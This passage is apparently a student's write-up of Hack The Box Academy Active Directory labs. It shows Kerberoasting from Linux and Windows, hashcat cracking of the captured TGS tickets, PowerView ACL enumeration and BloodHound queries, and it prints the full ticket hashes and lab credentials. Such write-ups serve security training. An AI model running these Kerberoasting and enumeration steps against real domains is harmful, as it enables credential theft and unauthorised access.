  Built-in account for guest access to the computer/domain    guest
  Key Distribution Center Service Account                     krbtgt
  HTB{LD@P_I$_W1ld}                                           bross
```

This command does the following:

dsquery user -disabled -desc *: Searches for all disabled user accounts and includes the description field.

dsget user -samid -desc: Retrieves the SAM account name and description of the found accounts.


## Kerberoasting - from Linux

> SSH to 10.129.24.162 (ACADEMY-EA-ATTACK01) with user "htb-student" and password "HTB_@cademy_stdnt!"

* **Retrieve the TGS ticket for the SAPService account. Crack the ticket offline and submit the password as your answer.**

I started by connecting to the target machine at 10.129.24.162 via SSH, using the provided credentials. Once connected, I ran GetUserSPNs.py:

```c
┌─[htb-student@ea-attack01]─[~]
└──╼ $GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/wley -request-user SAPService
Impacket v0.9.24.dev1+20211013.152215.3fe2d73a - Copyright 2021 SecureAuth Corporation

Password:
ServicePrincipalName                  Name        MemberOf                                                   PasswordLastSet             LastLogon  Delegation 
------------------------------------  ----------  ---------------------------------------------------------  --------------------------  ---------  ----------
SAPService/srv01.inlanefreight.local  SAPService  CN=Account Operators,CN=Builtin,DC=INLANEFREIGHT,DC=LOCAL  2022-04-18 14:40:02.959792  <never>               



$krb5tgs$23$*SAPService$INLANEFREIGHT.LOCAL$INLANEFREIGHT.LOCAL/SAPService*$a6ce0a3dc1febb42bd95c9ffea0c179e$0a9f6efda6b3a548ac50e2148dcd0d83d163ad71283bdd5a9d448a4c03cc9fc0c2991d225cb9aebc209c717df7165caa10164becf7f2dc45bd656d68fd005896cc0e0f4d0de2bb4bad5e86fbdad23825d127d1fc692323eb79868795e114dadb60fc37e9bda61d3198d568ad9c2bda595a705cee9000cd244bf080a070ed0c315f1efd52c8bfc9cd265d14f5a8099d89e0f3d2c8ffa184eb92f248f274807fa03ee94b47ba1db4bf7c8675384695ebeddd6ed8f47d69a831bf8ff0857bc2ccfedaf27c1f864eb17b4496d0cc5d63a76c72cd37bb53386500851a23d0445a96f8e58ca63b23ca1bc659490069ddaa020de0e98daa12713e992d94586d9fb2452f5bea520e92d8109c5c91a6b5dbafee46b5809505696d35523c8981dadf476a5faa268fb342663799f4a8fc98d90ad0245c5be7be9b4dc5f82af4f3609daa87324b8c3e6c5917fecad2c77c3e26eb99402caac457e7b5fc2de58ff4732acc92175cda31f86bd2a407c20686f1d8a55bd445ec5cac22dbc77e0a35385214d325d02f674dd37a5f8bba751db417ca410052dac3ab1b61f2acae05f6f73b1451f075d58a48bbcaeb350f2fe240b5f45cec82b13081ef17022e01777de486b6c986cc02c0843bc2300eb01a6eaa2a6fef887aa7b41c775544e378cc1950149bbc3691eb4fffd440c33bc1c48ea93ba95e10faf340b8a55b94c42548cb95536b84cd447d476c96e3b502ed8646711615e7234efc4b2ff41fe8281955c247e22281313557a502c4287c60d14e13187970402e32250efb0aad8c0ac3bb87544dcc269db67abb371cac8a29732bcd66e3cfd8f7887cf4fd45c24d8caf782ec7ffe0bdca6a459b9acafc4f4d5ef5557c712716f08bd99cda4706bce50d00064e36ef67e51c2d985c3db9a5a9d7611b5c9ab7f26ae8ebd94c78df08bd69aebc2ce08cdda97d4152d7a2edc2a08a887c0ae8454121f02bf4c2498269500504a6c132cc1381ef990d38d8f49b3921bdb3cdf83c3675e6b5770678f737b308c4c722bddf5e69f02b6f588981138d54cc5755d2fc4c1d4c1bc9ff556a20cc035ae818b4168dcbdcdbb59ae20dc1342d6a51711d6e3d6548e3f23e60beb4b8dd6b0c6c7220537f2c035b891b14db96551251762003041c74ce98b020379c8e29a5cfc40b96f8da7f444d19e9f9a3b29c2ca6b98b6038378a2cbedda527a29fa9d8d455b6ed628ade91d6f7e39088a076972b3428e078f758575798e1cc5d47659a0c9b7c1b9f7dd73764ccf486691dfd0b682037c3738a2f33540481443352bcbe29b413141e2ecf6ba568a4d0a81836840ffef80abca6b876deb4d2164486337694cf30bc10b33491070fc4b38edbe34cf4384426a19852514c625716e45c9ffff96bac8e3cd1c5dcc586bea883f87b06494b831edb92d510b3f756c7ff372ac0675e46f2d6662c54388d58ffb1166f
```
> I ran this command with the user wley and the password transporter@4 which we discovered on previous sections.

Once I got the TGS ticket, I copied it to the attack host and used hashcat to crack the ticket:

```c
hashcat -m 13100 SAPService_tgs /usr/share/wordlists/rockyou.txt
```

[![Screenshot-2025-03-18-111408.png](https://i.postimg.cc/nc7LGWF3/Screenshot-2025-03-18-111408.png)](https://postimg.cc/w7qH60sN)




* **What powerful local group on the Domain Controller is the SAPService user a member of?**

We got the answer to this question when I first ran GetUserSPNs.py:

```c
┌─[htb-student@ea-attack01]─[~]
└──╼ $GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/wley -request-user SAPService
Impacket v0.9.24.dev1+20211013.152215.3fe2d73a - Copyright 2021 SecureAuth Corporation

Password:
ServicePrincipalName                  Name        MemberOf                                                   PasswordLastSet             LastLogon  Delegation 
------------------------------------  ----------  ---------------------------------------------------------  --------------------------  ---------  ----------
SAPService/srv01.inlanefreight.local  SAPService  CN=Account Operators,CN=Builtin,DC=INLANEFREIGHT,DC=LOCAL  2022-04-18 14:40:02.959792  <never>               

```

## Kerberoasting - from Windows

>  RDP to 10.129.193.83 (ACADEMY-EA-MS01) with user "htb-student" and password "Academy_student_AD!"

* **What is the name of the service account with the SPN 'vmware/inlanefreight.local'?**

I initiated an RDP connection to the target Windows host 10.129.193.83 using xfreerdp with the provided credentials:

```c 
xfreerdp /v:10.129.193.83 /u:htb-student /p:Academy_student_AD!
```
Once connected, I launched Command Prompt with administrative privileges and executed:

```c
C:\Windows\system32>setspn.exe -Q */*
```
This command enumerated all the SPNs in the domain:
```c
<snip>
Checking domain DC=INLANEFREIGHT,DC=LOCAL
CN=krbtgt,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
        kadmin/changepw
CN=certsvc,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
        http://ACADEMY-EA-CA01.INLANEFREIGHT.LOCAL
CN=svc_vmwaresso,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
        vmware/inlanefreight.local
<snip>
```

* **Crack the password for this account and submit it as your answer.**

For this question I launched PowerShell with administrator privileges. I then executed:
```c
PS C:\Tools> Import-Module .\PowerView.PS1
PS C:\Tools> Get-DomainUser -Identity svc_vmwaresso | Get-DomainSPNTicket -Format Hashcat


SamAccountName       : svc_vmwaresso
DistinguishedName    : CN=svc_vmwaresso,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
ServicePrincipalName : vmware/inlanefreight.local
TicketByteHexStream  :
Hash                 : $krb5tgs$23$*svc_vmwaresso$INLANEFREIGHT.LOCAL$vmware/inlanefreight.local*$CF555C9A85AC18C7CBD44
                       20CBB071DFD$2B3CE2AD9849B3BDB16086A4932A310A4E809DAF85E9F839426B5C347AB57B1EBEF15B50D61F377D68D7
                       5D395A9F6318CA5C59D798AAF66C662F6D68681BDDFB0BC9CF27D466D0E20E2DA73F114A944D23B1D35F37593CD4A9C5
                       C84B8E69C86199D240B2D6C155CC3363B6434D35960982B3645FD604F2098F4C6A3016430730FC753DFE1AE3334F47E1
                       2D382E20E9DCB619413A70A72A196970079D01353DEB302D5D8C9AB0A60AC63A81CF14BE98FC26B05C8E65670D761AE0
                       0E1B3885DE7343AD50267FCFFAAA901688FC598CEB5362FA41A1495F6D1E742D0B5DDA7BEEE597EF44ABD8C9E2A2FB5E
                       D3D2FC6BD0B4ADEB207B2236FDA439D0B2BB7C25603D302496FC6EE0EC2726C0A72CB6932BB0F4077EA72C3C7D0073A5
                       37BDC604F1227331D5AE1DA83EDD334C069588529A975191C3105E76EB559CCAA54E90D52E534455D43938B9F775FB70
                       DD1BCA3601FE8FF4F3FF594BFFAABEC4D282B0DA9378AF7CA0878640E2417236EA93F7DBD49C96EB81C7DE5098FB1D00
                       70128E12F9291A7164AE009376A551F5A68FB485ED5A70A094FD2CC388C7CE2F9DF02D136F4784B3BE94A3BDE21B8D43
                       75615758F86CFCE3D88B86698A0E41B31FE36AB1F7A194FF492C3ECE15F59272B351E4E6CF072553D316DE9EC9F0D1E8
                       98C343B162ACCA2B613554FD225E437C701EC18D498D442686DB1E7D4A063E4AE18C9CFE2C13671A863AC4FBBCF71C20
                       52673A4644A5B214F113C91A82F065B24331C7BB55FD95E27306278C9604EBAAE59FDA3EA136C5CC266F4940534492D1
                       BA5779764CBB26054C4247244508BE52810DA8BA4FA0B9CB72EEBB3C9927FFD2B2DE5114730BFA74F5CC72488669BBC5
                       AF91749D49D737679B8AF6A042ADFED56DB24BE702A0FD45B4E65D0AB0315D891B8F6004C96842E5E7B7AE15F9F6EC0E
                       670E66E36C71BBC39B6477E9B2AFE8883EE2C36FE96C95FDE43875742EA69AC73EFF81547420D9249C28F231FCB69BBD
                       137C29BD7252DCC1270256CCB44855DD2E1E9C52E86AFF26C5A9F40E78D639D3191D4495166C14B0F6DA18DD086A9F24
                       3A13436DA969AA526D29D9E2C8B4FA117A4F4A11F6037EAD63D24A5EFF5B703A5B03798ED9D20A05AE9115040D21B8C7
                       E159BC7DFA5AF821B78CFB4F2A5B0BBC95A5E4B51A12813154730A369E27CE230AA82E5A45E850D8C039C7231B74F438
                       B02921897CF4534CE6462154AA577AA083E9932DF42460DA9D193DD1F171B962A50F8FDCE9CD89E94BBCB484D596B37C
                       9F391D849459BABF1FC2850BB65E40A4748FA4055CE3D4BDBCF0B71CA1C0741F3593D197523E9FBBF61837896F9C368D
                       4252A186A9D535AEBEF42228E241D6F394AE6057CAC091CA244E8BDD13134AC256038DF1BDDEB74DCD495D4A6784A2B2
                       BB91252EF8E8034940923B97941DBA7BBF81612453BAD95D8C4A800B50314030ADE01ADE97EE6669AC9083F4A9E668CE
                       B94F8A0B94188B48194254B6312625C282238A6944FE5A59CDA376C7B9362928F96C57C1E969434D691FE65DC292793F
                       20947EE9E1E879C344DE1818188E5A45EF731CEDB2DD2532B66B2EB8AF4E8203806DE59C4F4F8A521579CB6F5D7B81EA
                       906AE19BCFDA8644ED446D80A1728A827D270A189D4D64160B6409B2E9B216
```
After retrieving the hash for the user svc_vmwaresso, I proceeded to crack it using Hashcat.

```c

hashcat -m 13100 svc_tgs /usr/share/wordlists/rockyou.txt

```
[![Screenshot-2025-03-19-095421.png](https://i.postimg.cc/mr6fyFL4/Screenshot-2025-03-19-095421.png)](https://postimg.cc/94TnW0wg)


##ACL Enumeration

> RDP to 10.129.213.13 (ACADEMY-EA-MS01) with user "htb-student" and password "Academy_student_AD!"

* **What is the rights GUID for User-Force-Change-Password?**

User-Force-Change-Password extended rights-GUID	00299570-246d-11d0-a768-00aa006e0529

* **What flag can we use with PowerView to show us the ObjectAceType in a human-readable format during our enumeration?**

ResolveGUIDs

* **What privileges does the user damundsen have over the Help Desk Level 1 group?**
  
GenericWrite 

* **Using the skills learned in this section, enumerate the ActiveDirectoryRights that the user forend has over the user dpayne (Dagmar Payne).**
  
I initiated an RDP connection to the target Windows host 10.129.166.224 using xfreerdp with the provided credentials:

```c 
xfreerdp /v:10.129.166.224 /u:htb-student /p:Academy_student_AD!
```
Once connected, I launched Command Prompt with administrative privileges and executed:

```c
PS C:\Tools> Import-Module .\PowerView.ps1
PS C:\Tools> $sid = Convert-NameToSid forend
PS C:\Tools> Get-DomainObjectACL -ResolveGUIDs -Identity dpayne | ? {$_.SecurityIdentifier -eq $sid}


AceType               : AccessAllowed
ObjectDN              : CN=Dagmar Payne,OU=HelpDesk,OU=IT,OU=HQ-NYC,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
ActiveDirectoryRights : GenericAll
OpaqueLength          : 0
ObjectSID             : S-1-5-21-3842939050-3880317879-2865463114-1152
InheritanceFlags      : ContainerInherit
BinaryLength          : 36
IsInherited           : False
IsCallback            : False
PropagationFlags      : None
SecurityIdentifier    : S-1-5-21-3842939050-3880317879-2865463114-5614
AccessMask            : 983551
AuditFlags            : None
AceFlags              : ContainerInherit
AceQualifier          : AccessAllowed
```

* **What is the ObjectAceType of the first right that the forend user has over the GPO Management group? (two words in the format Word-Word)**

On PowerShell I executed: 
```c
PS C:\Tools> Import-Module .\PowerView.ps1
PS C:\Tools> $sid = Convert-NameToSid forend
PS C:\Tools> $group = Get-DomainGroup -Identity "GPO Management" -Properties DistinguishedName, SID
>>
PS C:\Tools> Get-DomainObjectACL -ResolveGUIDs -Identity $group.DistinguishedName |
>>   Where-Object { $_.SecurityIdentifier -eq $sid } |
>>   Select-Object -First 1 ActiveDirectoryRights, ObjectAceType

ActiveDirectoryRights ObjectAceType
--------------------- -------------
                 Self Self-Membership
```

## Privileged Access

>  RDP to 10.129.62.51 (ACADEMY-EA-MS01) with user "htb-student" and password "Academy_student_AD!"

* **What other user in the domain has CanPSRemote rights to a host?**

I initiated an RDP connection to the target Windows host 10.129.62.51 using xfreerdp with the provided credentials:

```c 
xfreerdp /v:10.129.62.51 /u:htb-student /p:Academy_student_AD!
```

Once connected, I launched PowerShell with administrative privileges and executed:

```
.\SharpHound.exe -c All --zipfilename ILFREIGHT
```
The command performs Active Directory (AD) data collection using SharpHound. I then proceeded to launch bloodhound

```c
PS C:\Tools\BloodHound-GUI> .\BloodHound.exe
```

Once BloodHound was launched, I proceeded to upload the data I had previously collected.

In the Raw Query box at the bottom of the screen, I entered the following query:

```c
MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group)) MATCH p2=(u1)-[:CanPSRemote*1..]->(c:Computer) RETURN p2
```

* **What host can this user access via WinRM? (just the computer name)**

Using the same RAW Query we executed earlier, we can identify the hosts that the user has access to.

[![Screenshot-2025-03-21-093743.png](https://i.postimg.cc/T2KdQHRz/Screenshot-2025-03-21-093743.png)](https://postimg.cc/kDdPgsRs)

